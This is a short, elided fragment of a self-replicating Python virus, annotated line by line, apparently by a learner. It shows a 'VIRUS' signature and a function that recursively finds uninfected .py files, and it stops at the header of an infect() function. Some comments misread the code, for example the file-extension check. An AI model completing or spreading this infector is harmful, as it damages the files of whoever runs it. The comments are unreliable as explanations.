...
SIGNATURE = "VIRUS" #the calling signature of a function and its return annotation
...
def locate(path): #this defines a function used to find a filepath
    ...
    for fname in filelist: #this is a for loop calling to the variable fname in the variable filelist established previously
        if os.path.isdir(path+"/"+fname): #the start of a conditional looking for a filepath and filename
            files_targeted.extend(locate(path+"/"+fname)) #it looks like this is looking to see if a file exist
        elif fname[-3:] == ".py": #Looks for the file on the list 3rd from the end
            infected = False #checks to see if that ine is infected
            ...
            if infected == False: #checks if its false
                files_targeted.append(path+"/"+fname) #appends the filepath/name
    return files_targeted #puts the files that are targeted

def infect(files_targeted): #defines a function that infects the files that are targeted
